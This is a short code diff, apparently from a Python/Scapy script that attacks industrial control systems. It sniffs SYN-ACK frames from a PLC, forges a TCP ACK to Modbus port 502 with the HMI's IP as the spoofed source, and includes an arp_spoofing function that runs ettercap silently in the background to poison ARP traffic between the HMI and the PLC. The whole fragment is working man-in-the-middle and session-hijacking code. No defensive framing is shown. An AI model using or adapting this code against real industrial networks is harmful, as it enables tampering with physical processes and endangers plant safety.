@@ -107,8 +107,8 @@ def get_ipmac():
         sleep(1)
 
 def cap():
-        filx = "dst host {} and tcp[13] = 0x12".format(plc_ip)
-        pframe1 = sniff(iface="eth0", count=1, filter=filx)
+        filx = "host {} and tcp[13] = 0x12".format(plc_ip)
+        pframe1 = sniff(iface="eth0", timeout=0.5, count=1, filter=filx)
         global frame1
         frame1 = pframe1[0]
 
@@ -134,6 +134,7 @@ def handshake():
        IP(src=hmi_ip, dst=plc_ip)/\
        TCP(sport=sport, dport=502, seq=seq_frame2, ack=ack_frame2, flags='A')
     sendp(tcp_ack)
+
 
 def arp_spoofing():
         arp2 = 'nohup ettercap -Tq -i eth0 -M ARP:oneway /{hmi}// /{plc}// >/dev/null 2>&1 &'.format(hmi=hmi_ip, plc=plc_ip)
